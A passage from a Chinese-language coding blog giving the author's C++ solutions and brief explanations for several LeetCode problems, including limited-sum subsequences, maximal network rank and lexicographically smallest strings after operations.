&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> flaga || flagb;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>ab两个字符串在同一个位置分隔开，若 $ pre_a + suf_b $ 或 $ pre_b + suf_a $ 是回文串，则返回true，否则返回false<br>这个规则相当于ab截取相同且任意长的前缀并交换，看交换后是否存在回文<br>我的思路是先比较a的第i位与b的倒数第i位是否想等，找到第一次不相等的位置i，此时可以从第i位分割，判断b的剩余部分是否是回文，或者从len-i-1处分割，判断a的剩余部分是否是回文<br>若都不是，再比较b的第i位与a的倒数i位，找到第一个不满足的i，再比较a，b的剩余部分</p></blockquote><h3 id="优化行数"><a href="#优化行数" class="headerlink" title="优化行数"></a>优化行数</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">checkPalindromeFormation</span><span class="params">(string a, string b)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = a.<span class="built_in">length</span>();</span><br><span class="line">        <span class="type">int</span> paliA = len/<span class="number">2</span><span class="number">-1</span>, paliB = len/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span>(paliA &gt; <span class="number">0</span> &amp;&amp; a[paliA] == a[len<span class="number">-1</span>-paliA]) paliA--;</span><br><span class="line">        <span class="keyword">while</span>(paliB &gt; <span class="number">0</span> &amp;&amp; b[paliB] == b[len<span class="number">-1</span>-paliB]) paliB--;</span><br><span class="line">        <span class="type">int</span> i, j;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; len/<span class="number">2</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i] != b[len<span class="number">-1</span>-i]) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; len/<span class="number">2</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(b[j] != a[len<span class="number">-1</span>-j]) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">min</span>(paliA, paliB) &lt; <span class="built_in">max</span>(i, j);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>最大的情况下执行$2*len$次</p></blockquote><h2 id="2389-和有限的最长子序列"><a href="#2389-和有限的最长子序列" class="headerlink" title="2389. 和有限的最长子序列"></a><a href="https://leetcode.cn/problems/longest-subsequence-with-limited-sum/description/">2389. 和有限的最长子序列</a></h2><h3 id="艺术就是派大星"><a href="#艺术就是派大星" class="headerlink" title="艺术就是派大星"></a>艺术就是派大星</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">answerQueries</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, vector&lt;<span class="type">int</span>&gt;&amp; queries)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; answer;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>(), m = queries.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(sum + nums[j] &lt;= queries[i]) &#123;</span><br><span class="line">                    count ++;</span><br><span class="line">                    sum += nums[j];                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            answer.<span class="built_in">push_back</span>(count);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> answer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">answerQueries</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, vector&lt;<span class="type">int</span>&gt;&amp; queries)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; answer;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>(), m = queries.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">            nums[j] += nums[j<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="type">int</span> count = <span class="built_in">upper_bound</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>(), queries[i]) - nums.<span class="built_in">begin</span>();</span><br><span class="line">            answer.<span class="built_in">push_back</span>(count);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> answer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="手写upper-bound"><a href="#手写upper-bound" class="headerlink" title="手写upper_bound()"></a>手写upper_bound()</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">answerQueries</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, vector&lt;<span class="type">int</span>&gt;&amp; queries)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; answer;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>(), m = queries.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">            nums[j] += nums[j<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="type">int</span> l = <span class="number">0</span>, r = n;</span><br><span class="line">            <span class="keyword">while</span>(l &lt; r) &#123;</span><br><span class="line">                <span class="type">int</span> mid = l + (r - l) / <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">if</span>(nums[mid] &gt; queries[i]) &#123;</span><br><span class="line">                    r = mid;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    l = mid+<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            answer.<span class="built_in">push_back</span>(l);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> answer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="1615-最大网络秩"><a href="#1615-最大网络秩" class="headerlink" title="1615. 最大网络秩"></a><a href="https://leetcode.cn/problems/maximal-network-rank/description/">1615. 最大网络秩</a></h2><h3 id="暴力"><a href="#暴力" class="headerlink" title="暴力"></a>暴力</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maximalNetworkRank</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; roads)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; <span class="built_in">mat</span>(n, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(n, <span class="literal">false</span>));</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">count</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; r : roads) &#123;</span><br><span class="line">            mat[r[<span class="number">0</span>]][r[<span class="number">1</span>]] = <span class="literal">true</span>;</span><br><span class="line">            mat[r[<span class="number">1</span>]][r[<span class="number">0</span>]] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> max_a = <span class="number">0</span>, max_b = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> max_i = <span class="number">0</span>, max_j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(mat[i][j]) &#123;</span><br><span class="line">                    count[i]++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(count[i] &gt;= max_a) &#123;</span><br><span class="line">                max_b = max_a;</span><br><span class="line">                max_a = count[i];</span><br><span class="line">                max_j = max_i;</span><br><span class="line">                max_i = i;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(count[i] &gt; max_b)&#123;</span><br><span class="line">                max_b = count[i];</span><br><span class="line">                max_j = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = i+<span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(((max_a == count[i] &amp;&amp; max_b == count[j])||(max_b == count[i] &amp;&amp; max_a == count[j])) &amp;&amp; !mat[i][j]) &#123;</span><br><span class="line">                    <span class="keyword">return</span> max_a + max_b;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max_a + max_b - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>先统计每个城市的道路数，找到最大的两个，然后查找在所有等于最大两个道路数的城市组合中，有无没有边的组合，否则就减一</p></blockquote><h3 id="优化后续查找"><a href="#优化后续查找" class="headerlink" title="优化后续查找"></a>优化后续查找</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maximalNetworkRank</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; roads)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; <span class="built_in">mat</span>(n, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(n, <span class="literal">false</span>));</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">count</span><span class="params">(n)</span>, <span class="title">index</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; r : roads) &#123;</span><br><span class="line">            mat[r[<span class="number">0</span>]][r[<span class="number">1</span>]] = <span class="literal">true</span>;</span><br><span class="line">            mat[r[<span class="number">1</span>]][r[<span class="number">0</span>]] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(mat[i][j]) &#123;</span><br><span class="line">                    count[i]++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            index[i] = i;</span><br><span class="line">            mat[i][i] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(index.<span class="built_in">begin</span>(), index.<span class="built_in">end</span>(), [&amp;](<span class="type">int</span> a, <span class="type">int</span> b)-&gt;<span class="type">bool</span>&#123;<span class="keyword">return</span> count[a] &lt; count[b];&#125;);</span><br><span class="line">        <span class="type">int</span> x = n<span class="number">-1</span>,y = n<span class="number">-2</span>;</span><br><span class="line">        <span class="keyword">while</span>(x &gt;= <span class="number">0</span> &amp;&amp; count[index[x]] == count[index[n<span class="number">-1</span>]]) &#123;</span><br><span class="line">            y = x<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">while</span>(y &gt;= <span class="number">0</span> &amp;&amp; count[index[y]] == count[index[n<span class="number">-2</span>]]) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!mat[index[x]][index[y]]) &#123;</span><br><span class="line">                    <span class="keyword">return</span> count[index[n<span class="number">-1</span>]] + count[index[n<span class="number">-2</span>]];</span><br><span class="line">                &#125;</span><br><span class="line">                y--;</span><br><span class="line">            &#125;</span><br><span class="line">            x--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count[index[n<span class="number">-1</span>]] + count[index[n<span class="number">-2</span>]] - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="1605-给定行和列的和求可行矩阵"><a href="#1605-给定行和列的和求可行矩阵" class="headerlink" title="1605. 给定行和列的和求可行矩阵"></a><a href="https://leetcode.cn/problems/find-valid-matrix-given-row-and-column-sums/">1605. 给定行和列的和求可行矩阵</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">restoreMatrix</span>(vector&lt;<span class="type">int</span>&gt;&amp; rowSum, vector&lt;<span class="type">int</span>&gt;&amp; colSum) &#123;</span><br><span class="line">        <span class="type">int</span> m = rowSum.<span class="built_in">size</span>(),n = colSum.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res = vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;(m, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="type">int</span> x = <span class="built_in">min</span>(rowSum[i], colSum[j]);</span><br><span class="line">                res[i][j] = x;</span><br><span class="line">                rowSum[i] -= x;</span><br><span class="line">                colSum[j] -= x;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>根据行列和的要求，当前方格中可以填入的最大值是两个要求的最小值，直接填入该值，并更新对应位置的要求</p></blockquote><h2 id="2383-赢得比赛需要的最少训练时长"><a href="#2383-赢得比赛需要的最少训练时长" class="headerlink" title="2383. 赢得比赛需要的最少训练时长"></a><a href="https://leetcode.cn/problems/minimum-hours-of-training-to-win-a-competition/description/">2383. 赢得比赛需要的最少训练时长</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minNumberOfHours</span><span class="params">(<span class="type">int</span> initialEnergy, <span class="type">int</span> initialExperience, vector&lt;<span class="type">int</span>&gt;&amp; energy, vector&lt;<span class="type">int</span>&gt;&amp; experience)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> eng = <span class="number">1</span>, expLeft = <span class="number">0</span>, len = energy.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> exp = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            eng += energy[i];</span><br><span class="line">            exp = <span class="built_in">max</span>(exp, experience[i] - expLeft+<span class="number">1</span>);</span><br><span class="line">            expLeft += experience[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (eng &gt; initialEnergy ? eng - initialEnergy : <span class="number">0</span>) + (exp &gt; initialExperience ? exp - initialExperience : <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>能量是从左到右消耗的，所以初始能量大于能量总和就可以<br>经验是可以从左到右累积的，所以初始经验大于当前对手的经验减去累积的经验就可以了</p></blockquote><h2 id="1625-执行操作后字典序最小的字符串"><a href="#1625-执行操作后字典序最小的字符串" class="headerlink" title="1625. 执行操作后字典序最小的字符串"></a><a href="https://leetcode.cn/problems/lexicographically-smallest-string-after-applying-operations/description/">1625. 执行操作后字典序最小的字符串</a></h2><h3 id="过于暴力"><a href="#过于暴力" class="headerlink" title="过于暴力"></a>过于暴力</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    map&lt;string, <span class="type">bool</span>&gt; visited;</span><br><span class="line">    <span class="type">int</span> len, a, b;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(string&amp; s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; len; i+=<span class="number">2</span>) &#123;</span><br><span class="line">            s[i] = (s[i] + a)%<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">rotate</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        string ret;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            ret.<span class="built_in">push_back</span>(s[(i+b)%len]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">search</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(visited.<span class="built_in">count</span>(s) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        visited[s] = <span class="literal">true</span>;</span><br><span class="line">        <span class="built_in">search</span>(<span class="built_in">rotate</span>(s));</span><br><span class="line">        <span class="built_in">add</span>(s);</span><br><span class="line">        <span class="built_in">search</span>(s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">findLexSmallestString</span><span class="params">(string s, <span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;len = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">this</span>-&gt;a = a;</span><br><span class="line">        <span class="keyword">this</span>-&gt;b = b;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            s[i] -= <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">search</span>(s);</span><br><span class="line">        string ret = visited.<span class="built_in">begin</span>()-&gt;first;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            ret[i] += <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>暴力，硬搜，把所有可能情况都算出来</p></blockquote><h2 id="面试题-17-05-字母与数字"><a href="#面试题-17-05-字母与数字" class="headerlink" title="面试题 17.05. 字母与数字"></a><a href="https://leetcode.cn/problems/find-longest-subarray-lcci/description/">面试题 17.05. 字母与数字</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">findLongestSubarray</span><span class="params">(vector&lt;string&gt;&amp; array)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = array.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">sum</span><span class="params">(len)</span></span>;</span><br><span class="line">        sum[<span class="number">0</span>] = <span class="built_in">isalpha</span>(array[<span class="number">0</span>][<span class="number">0</span>]) ? <span class="number">1</span> : <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; len; i++) &#123;</span><br><span class="line">            sum[i] = sum[i<span class="number">-1</span>] + (<span class="built_in">isalpha</span>(array[i][<span class="number">0</span>]) ? <span class="number">1</span> : <span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; m;</span><br><span class="line">        <span class="type">int</span> left = <span class="number">0</span>, right = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(sum[i] == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(i &gt; right - left) &#123;</span><br><span class="line">                    left = <span class="number">0</span>;</span><br><span class="line">                    right = i;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(!m.<span class="built_in">count</span>(sum[i])) &#123;</span><br><span class="line">                    m[sum[i]] = i + <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span>(i - m[sum[i]] &gt; right - left) &#123;</span><br><span class="line">                        right = i;</span><br><span class="line">                        left = m[sum[i]];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;array.<span class="built_in">begin</span>() + left, array.<span class="built_in">begin</span>() + right + <span class="number">1</span>&#125;;</span><br><span class="line">    &#125;</span><br><span 